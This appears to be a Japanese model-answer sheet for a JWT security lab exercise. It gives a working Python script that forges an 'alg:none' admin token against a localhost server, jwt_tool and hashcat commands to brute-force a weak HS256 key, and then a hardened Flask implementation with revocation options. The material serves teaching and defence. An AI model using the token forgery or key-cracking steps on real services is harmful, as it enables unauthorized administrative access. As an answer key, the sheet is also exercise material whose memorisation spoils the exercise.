# 模範解答 03: 脆弱な JWT

## レベル1: `alg:none` 攻撃

```python
import base64, json, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# 1. 正規トークンを取得して中身を見る
token = requests.post("http://localhost:5000/login", json={"user": "alice"}).json()["token"]
header_b64, payload_b64, sig = token.split(".")
print("payload:", base64.urlsafe_b64decode(payload_b64 + "=="))  # role: user

# 2. alg:none で role を admin に偽造(署名は空)
forged_header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
forged_payload = b64url(json.dumps({"user": "alice", "role": "admin"}).encode())
forged = f"{forged_header}.{forged_payload}."   # 署名なし

r = requests.get("http://localhost:5000/admin",
                 headers={"Authorization": f"Bearer {forged}"})
print(r.status_code, r.json())   # 200 / admin flag  ← 突破成功
```

**なぜ成立したか**: サーバが `algorithms=["HS256", "none"]` と `none` を許可していたため、署名検証を回避できた。

## レベル2: 弱い鍵の総当たり

サーバが `algorithms=["HS256"]` に修正されても、HS256 は共有鍵(HMAC)。鍵が `"secret"` のように弱いと、攻撃者は入手した任意の JWT に対し、辞書内の各候補鍵で署名を再計算し、一致する鍵をオフラインで特定できる。

```
jwt_tool <token> -C -d rockyou.txt      # 辞書で鍵を総当たり
# または hashcat -m 16500 jwt.txt wordlist.txt
```

鍵が判明すれば、`role: admin` の**正規に署名された**トークンを自由に作れる。→ 対策は「長くランダムな鍵(32バイト以上)」。

## レベル3: 安全版

```python
import os, jwt, datetime
from flask import Flask, request, jsonify

app = Flask(__name__)
SECRET = os.environ["JWT_SECRET"]        # 環境変数(32+ bytes のランダム)

def make_token(user, role):
    now = datetime.datetime.now(datetime.timezone.utc)
    return jwt.encode(
        {"user": user, "role": role, "iat": now,
         "exp": now + datetime.timedelta(minutes=15)},   # 有効期限
        SECRET, algorithm="HS256")

@app.get("/admin")
def admin():
    token = request.headers.get("Authorization", "").removeprefix("Bearer ")
    try:
        data = jwt.decode(token, SECRET, algorithms=["HS256"])  # アルゴリズム固定
    except jwt.ExpiredSignatureError:
        return jsonify(error="expired"), 401
    except jwt.InvalidTokenError:
        return jsonify(error="invalid"), 401
    if data.get("role") != "admin":
        return jsonify(error="forbidden"), 403
    return jsonify(secret="admin ok")
```

修正点:
1. **アルゴリズム固定**(`algorithms=["HS256"]`。`none` 排除)
2. **強い鍵を環境変数から**(ハードコード廃止)
3. **有効期限 `exp`**(漏洩時の被害時間を限定)
4. 例外を種類別にハンドリング

### 即時失効の2方式

| 方式 | 内容 | トレードオフ |
|------|------|-------------|
| 短命アクセス + リフレッシュトークン | アクセストークンを数分に。失効はリフレッシュを無効化 | 完全な即時性はないが、DB 参照を最小化。実務標準 |
| ブラックリスト(失効リスト) | 失効した jti を DB/Redis に記録し毎回照合 | 即時失効できるが、毎リクエストで参照が必要(ステートレスの利点を一部失う) |

重要システムは素直にサーバサイドセッション(Lesson 07)を選ぶ判断もある。

## 学びのポイント

- JWT は「正しく検証」して初めて安全。検証の甘さ(none 許可・弱い鍵)が命取り。
- 「ステートレスで即時失効したい」は本質的に矛盾。要件に応じて設計を選ぶ。
